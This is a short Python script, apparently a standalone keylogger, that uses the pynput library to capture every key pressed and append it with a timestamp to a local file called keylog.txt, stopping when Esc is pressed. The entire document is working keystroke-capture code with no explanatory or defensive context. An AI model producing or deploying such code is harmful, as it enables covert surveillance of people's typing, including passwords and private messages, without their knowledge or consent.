import pynput
from pynput.keyboard import Key, Listener
import time

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{time.ctime()} - {key.char}\n")
        except AttributeError:
            f.write(f"{time.ctime()} - {key}\n")

def on_release(key):
    if key == Key.esc:
        # Stop listener on pressing ESC
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
